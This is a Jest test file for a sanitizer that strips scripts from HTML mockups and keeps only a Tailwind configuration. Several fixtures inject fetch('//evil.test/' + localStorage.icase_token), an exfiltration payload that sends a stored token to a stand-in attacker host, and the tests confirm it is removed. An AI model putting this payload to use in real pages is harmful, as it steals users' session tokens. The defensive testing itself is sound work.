const MockupValidatorService = require('../src/infrastructure/services/MockupValidatorService');

const page = (script) => `<!DOCTYPE html><html><head><script src="https://cdn.tailwindcss.com"></script><script>${script}</script></head><body><main>x</main></body></html>`;
const sanitize = (script) => new MockupValidatorService().sanitizar(page(script));

describe('el sanitizador y la configuración de Tailwind', () => {
  test('conserva una configuración válida, normalizada como datos', () => {
    const { html } = sanitize("tailwind.config = { theme: { extend: { colors: { primary: { 500: '#111111' } } } } }");
    expect(html).toContain('<script>tailwind.config = {"theme":{"extend":{"colors":{"primary":{"500":"#111111"}}}}}</script>');
  });

  test.each([
    ['código tras la configuración', "tailwind.config = { theme: {} }; fetch('//evil.test/' + localStorage.icase_token)"],
    ['código antes de la configuración', "fetch('//evil.test/' + localStorage.icase_token); tailwind.config = { theme: {} }"],
    ['llamada dentro del objeto', 'tailwind.config = { theme: { x: foo() } }'],
    ['sintaxis inválida', 'tailwind.config = { theme: ']
  ])('no conserva un script con %s', (_name, script) => {
    const { html, advertencias } = sanitize(script);
    expect(html).not.toContain('evil.test');
    expect(html).not.toContain('localStorage');
    expect(html).not.toContain('foo()');
    expect(advertencias.length).toBeGreaterThan(0);
  });

  test('el CDN de Tailwind se conserva y un script que no es de configuración sigue eliminándose', () => {
    const { html, advertencias } = new MockupValidatorService().sanitizar('<!DOCTYPE html><html><head><script src="https://cdn.tailwindcss.com"></script><script>alert(1)</script></head><body>x</body></html>');
    expect(html).toContain('<script src="https://cdn.tailwindcss.com"></script>');
    expect(html).not.toContain('alert(1)');
    expect(advertencias.join(' ')).toContain('Script');
  });
});
